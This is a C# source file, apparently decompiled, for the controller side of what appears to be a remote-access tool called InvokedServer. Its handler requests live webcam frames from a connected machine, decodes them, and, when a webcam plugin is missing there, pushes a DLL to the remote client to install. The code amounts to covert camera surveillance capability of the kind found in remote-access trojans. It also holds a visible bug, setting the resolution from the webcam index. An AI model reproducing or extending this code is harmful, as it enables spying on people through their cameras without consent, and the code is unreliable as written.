

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Video.Codecs;
using InvokedServer.Enums;
using InvokedServer.Helper;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;


namespace InvokedServer.Messages
{
	public class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
	{
		private string _pluginPath = "Plugins\\PluginRemoteWebcam.dll";
		private string _pluginName = "RemoteWebcam";
		private readonly object _syncLock = new object();
		private readonly object _sizeLock = new object();
		private Size _localResolution;
		public List<Size> ResolutionsList = new List<Size>();
		private readonly InvokedServer.Networking.Client _client;
		private UnsafeStreamCodec _codec;

		public event RemoteWebcamHandler.PluginStatusEventHandler PluginStatusChanged;

		private void OnPluginStatusChanged(PluginStatus value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteWebcamHandler.PluginStatusEventHandler pluginStatusChanged = this.PluginStatusChanged;
				if (pluginStatusChanged == null)
					return;
				pluginStatusChanged((object)this, (PluginStatus)val);
			}), (object)value);
		}

		public event RemoteWebcamHandler.MessegeSizeHandler NewImageSizeUpdate;

		private void OnNewImageSizeUpdate(string text)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteWebcamHandler.MessegeSizeHandler newImageSizeUpdate = this.NewImageSizeUpdate;
				if (newImageSizeUpdate == null)
					return;
				newImageSizeUpdate((object)this, (string)val);
			}), (object)text);
		}

		public bool IsStarted { get; set; }

		public Size LocalResolution
		{
			get
			{
				lock (this._sizeLock)
					return this._localResolution;
			}
			set
			{
				lock (this._sizeLock)
					this._localResolution = value;
			}
		}

		public event RemoteWebcamHandler.AddWebcamsEventHandler AddWebcams;

		private void OnAddWebcams(List<string> webcams)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteWebcamHandler.AddWebcamsEventHandler addWebcams = this.AddWebcams;
				if (addWebcams == null)
					return;
				addWebcams((object)this, (List<string>)val);
			}), (object)webcams);
		}

		public event RemoteWebcamHandler.UpdateImageEventHandler UpdateImage;

		private void OnUpdateImage(Bitmap img)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				RemoteWebcamHandler.UpdateImageEventHandler updateImage = this.UpdateImage;
				if (updateImage == null)
					return;
				updateImage((object)this, (Bitmap)val);
			}), (object)img);
		}

		public RemoteWebcamHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetWebcamImageResponse _:
				case GetWebcamsResponse _:
					return true;
				default:
					return message is CheckPluginResponse;
			}
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetWebcamImageResponse message1:
					this.Execute(sender, message1);
					break;
				case GetWebcamsResponse message2:
					this.Execute(sender, message2);
					break;
				case CheckPluginResponse message3:
					this.Execute(sender, message3);
					break;
			}
		}

		public void CheckPluginStatus()
		{
			this._client.Send<CheckPlugin>(new CheckPlugin()
			{
				PluginName = this._pluginName
			});
		}

		public void BeginReceiveFrames(int quality, int WebcamVar, int ResolutionVar)
		{
			lock (this._syncLock)
			{
				this.IsStarted = true;
				this._codec?.Dispose();
				this._codec = (UnsafeStreamCodec)null;
				this._client.Send<GetWebcamImage>(new GetWebcamImage()
				{
					Quality = quality,
					Webcam = WebcamVar,
					Resolution = WebcamVar
				});
			}
		}

		public void EndReceiveFrames()
		{
			lock (this._syncLock)
			{
				this.IsStarted = false;
				this._client.Send<DoWebcamStop>(new DoWebcamStop());
			}
		}

		public void RefreshDisplays() => this._client.Send<GetWebcams>(new GetWebcams());

		private void Execute(ISender client, CheckPluginResponse message)
		{
			if (message.PluginName != this._pluginName)
				return;
			if (message.Status)
			{
				this.OnPluginStatusChanged(PluginStatus.Loaded);
				this.RefreshDisplays();
			}
			else
			{
				this.OnPluginStatusChanged(PluginStatus.Installing);
				if (File.Exists(this._pluginPath))
					this._client.Send<DoPlugin>(new DoPlugin()
					{
						PluginName = this._pluginName,
						Data = Zip.Compress(File.ReadAllBytes(this._pluginPath))
					});
				else
					this.OnPluginStatusChanged(PluginStatus.PluginFileNotFound);
			}
		}

		private void Execute(ISender client, GetWebcamsResponse message)
		{
			this.OnAddWebcams(message.Webcams);
		}

		private void Execute(ISender client, GetWebcamImageResponse message)
		{
			if (!this.IsStarted || message == null || message.Image == null)
				return;
			lock (this._syncLock)
			{
				if (this._codec == null || this._codec.ImageQuality != message.Quality || this._codec.Monitor != message.Webcam || this._codec.Resolution != message.Resolution)
				{
					this._codec?.Dispose();
					this._codec = new UnsafeStreamCodec(message.Quality, message.Webcam, message.Resolution);
				}
				try
				{
					using (MemoryStream inStream = new MemoryStream(message.Image))
						this.OnReport(new Bitmap((Image)this._codec.DecodeData((Stream)inStream), this.LocalResolution));
				}
				catch
				{
				}
			}
			double num1 = (double)message.Image.Length / 1024.0;
			double num2 = num1 / 1024.0;
			this.OnNewImageSizeUpdate(num2 < 1.0 ? string.Format("{0:F2} KB", (object)num1) : string.Format("{0:F2} MB", (object)num2));
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			lock (this._syncLock)
			{
				this._codec?.Dispose();
				this.IsStarted = false;
				this._client.Send<DoWebcamStop>(new DoWebcamStop());
			}
		}

		public delegate void PluginStatusEventHandler(object sender, PluginStatus value);

		public delegate void MessegeSizeHandler(object sender, string text);

		public delegate void AddWebcamsEventHandler(object sender, List<string> webcams);

		public delegate void UpdateImageEventHandler(object sender, Bitmap img);
	}
}